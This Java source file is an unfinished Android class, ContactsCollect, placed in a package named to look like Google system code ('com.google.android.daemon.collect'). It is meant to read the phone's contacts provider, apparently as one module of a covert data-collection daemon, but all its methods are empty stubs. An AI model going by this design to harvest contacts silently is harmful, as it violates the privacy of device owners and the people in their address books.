/**
 * @(#) ContactsCollect.java Created on 2013-1-19
 *
 * Copyright (c) 2013 com.braver. All Rights Reserved
 */
package com.google.android.daemon.collect;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Contacts;

import com.google.android.daemon.collect.read.ProviderReader;

/**
 * The class <code>ContactsCollect</code>
 * 
 * @author ouyangfeng
 * @version 1.0
 */
public class ContactsCollect implements ObjectCollect {

    protected Context mContext;
    
    protected ContactReader reader = new ContactReader();

    public ContactsCollect(Context mContext) {
        this.mContext = mContext;
    }

    /**
     * (non-Javadoc)
     * 
     * @see com.google.android.daemon.collect.ObjectCollect#collect()
     */
    @Override
    public String collect() {
        return reader();
    }
    
    public String reader(){
        return null;
    }

    private final class ContactReader extends ProviderReader {

        /**
         * Constructor
         * 
         * @param mContext
         */
        protected ContactReader() {
            super(ContactsCollect.this.mContext);
        }

        /**
         * (non-Javadoc)
         * @see com.google.android.daemon.collect.read.ProviderReader#readRow(int[], android.database.Cursor)
         */
        @Override
        protected String readRow(int[] columnIndexs, Cursor cur) {
            // TODO Auto-generated method stub
            return null;
        }

        /**
         * (non-Javadoc)
         * @see com.google.android.daemon.collect.read.ProviderReader#getProjection()
         */
        @Override
        protected String[] getProjection() {
            return new String [] {};
        }

        /**
         * (non-Javadoc)
         * @see com.google.android.daemon.collect.read.ProviderReader#getUri()
         */
        @Override
        protected Uri getUri() {
            return Contacts.CONTENT_URI;
        }

        /**
         * (non-Javadoc)
         * @see com.google.android.daemon.collect.read.ProviderReader#getRootTag()
         */
        @Override
        protected String getRootTag() {
            return "Contact";
        }

    }
}
